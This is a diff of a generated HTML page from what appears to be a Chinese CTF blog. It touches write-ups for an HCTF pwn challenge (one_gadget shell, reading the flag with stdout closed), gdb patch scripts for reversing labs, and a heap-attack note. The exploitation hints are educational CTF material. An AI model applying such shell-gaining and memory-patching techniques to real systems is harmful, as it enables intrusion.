+  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8uLL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1uLL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1337&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;解法就不说了，可以参考 &lt;a href=&#34;https://bysec.io/hctf/writeup.html#the-end&#34;&gt;官方 writeup&lt;/a&gt;。但更多人用的因该是非预期解直接使用 one_gadget。&lt;/p&gt;
+
+&lt;p&gt;总之，可以用某种方式拿到一个交互式的 shell （因为 stdout 已经被关闭，所以不会有输出）。可以通过 &lt;code&gt;cat flag &amp;gt;&amp;amp;0&lt;/code&gt;， &lt;code&gt;exec 1&amp;gt;&amp;amp;0; cat flag&lt;/code&gt; 等方法得到 flag。&lt;/p&gt;
 
 &lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
 
@@ -12689,7 +12728,7 @@ qemu: uncaught target signal &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; &lt;s
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwnable_mipstake &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ls /usr/mips-linux-gnu 
 lib
 
-# 没有 etc 这个目录&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;span class=&#34;c1&#34;&gt;# 没有 etc 这个目录&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;那么 &lt;code&gt;/etc/ld.so.nohwacap&lt;/code&gt; 这些文件是什么作用呢？google 了一下，发现大概就是和 &lt;code&gt;LD_PRELOAD&lt;/code&gt; 一个作用&lt;/p&gt;
@@ -15263,15 +15302,15 @@ Count: &lt;span class=&#34;m&#34;&gt;582401&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;b *0x4005F0
 r
 
-&lt;span class=&#34;c1&#34;&gt;#set args
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$rdi&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
-&lt;span class=&#34;c1&#34;&gt;#dumpargs --force
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; *&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;long *&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;0x7fffffffe332&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;0x0101010101010101
+&lt;span class=&#34;c1&#34;&gt;#set args&lt;/span&gt;
+&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$rdi&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#dumpargs --force&lt;/span&gt;
+&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; *&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;long *&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;0x7fffffffe332&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;0x0101010101010101
 &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; *&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;long *&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;0x7fffffffe34d&lt;span class=&#34;o&#34;&gt;)=&lt;/span&gt;0x0101010101010101
 c
 
-&lt;span class=&#34;c1&#34;&gt;# zdump /etc/localtime
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;# 因为ASLR请自行修改对应地址&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;span class=&#34;c1&#34;&gt;# zdump /etc/localtime&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# 因为ASLR请自行修改对应地址&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;第二层验证提示&lt;/p&gt;
@@ -16281,8 +16320,8 @@ CTF? -&amp;gt; UPX!
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;lab1 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; cat solve 
 b *get_flag+389
 r
-&lt;span class=&#34;c1&#34;&gt;#your input
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$eax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$edx&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#your input&lt;/span&gt;
+&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$eax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$edx&lt;/span&gt;
 c
 lab1 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
@@ -18589,7 +18628,7 @@ unsorted bin attack 的结果是向任一地址写一个不可控的大数(unsor
 &lt;p&gt;&lt;em&gt;An undergraduate in &lt;a href=&#34;http://www.bit.edu.cn&#34;&gt;Beijing Institute of Technology&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
 
 &lt;ul&gt;
-&lt;li&gt;Distro: latest &lt;a href=&#34;https://www.deepin.org&#34;&gt;Deepin&lt;/a&gt;, considering &lt;a href=&#34;https://manjaro.org&#34;&gt;Manjaro&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Distro: latest &lt;a href=&#34;https://manjaro.org&#34;&gt;Manjaro&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Vim or Emacs: &lt;a href=&#34;https://www.vim.org&#34;&gt;Vim&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;bash, zsh or fish: &lt;a href=&#34;https://ohmyz.sh&#34;&gt;oh-my-zsh&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Tabs or spaces: spaces&lt;/li&gt;
